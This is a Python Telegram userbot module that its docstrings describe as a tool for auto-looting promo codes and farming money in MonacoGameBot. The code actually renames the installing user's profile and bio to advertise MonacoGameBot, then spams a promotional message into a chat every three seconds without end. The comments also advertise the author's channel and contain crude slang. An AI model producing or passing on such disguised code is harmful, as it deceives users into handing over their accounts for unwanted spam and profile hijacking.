import logging
import asyncio
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from .. import loader, utils

logger = logging.getLogger(__name__)


def register(cb):
    cb(TopMonacoBot())


class TopMonacoBot(loader.Module):
    """Модуль для аволута промокодов в боте и афто фарм денег в MonacoGameBot канал с говно модул      @ZONESOO2 ладдадабабу"""
    strings = {'name': 'TopMonacoBot'}

    async def tddcmd(self, message):
        """Жоский автолут промокодов и фарм в могако боте по комаоде .tdd"""
        try:
            
            await message.client(UpdateProfileRequest(first_name='MonacoGameBot❤️', about='@MonacoGameBot❤️'))

            # Получаем па попе
            chat = await message.client.get_entity('https://t.me/monpromochat')

            while True:
                # Канал с пися модулями https://t.me/ZONESOO2
                await message.client.send_message(chat, 'Монако самый топовый бот❤️❤️❤️')
                await asyncio.sleep(3)

        except Exception as e:
            logger.exception("Error in tdd command: %s", e)
            await utils.answer(message, "<b>Ошибка при выполнении команды!</b>")
